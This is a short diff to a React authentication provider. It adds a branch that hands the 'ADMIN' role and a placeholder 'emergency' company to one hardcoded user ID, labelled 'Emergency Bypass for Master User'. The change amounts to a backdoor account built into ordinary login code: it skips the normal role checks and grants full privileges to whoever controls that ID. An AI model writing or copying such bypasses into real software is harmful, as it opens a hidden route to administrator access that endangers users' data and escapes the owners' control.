@@ -58,6 +58,10 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
                             last_login: new Date().toISOString(),
                             last_device: navigator.userAgent
                         });
+                    } else if (userId === '2b566ce5-a550-4e93-ba4a-b91c77539c05') {
+                        // Emergency Bypass for Master User
+                        setRole('ADMIN');
+                        setCompany({ id: 'emergency', name: 'HR-TECNOLOGIA (TRANSIT)', logo_url: '', watermark_url: '' });
                     } else {
                         setRole(null);
                         setCompany(null);
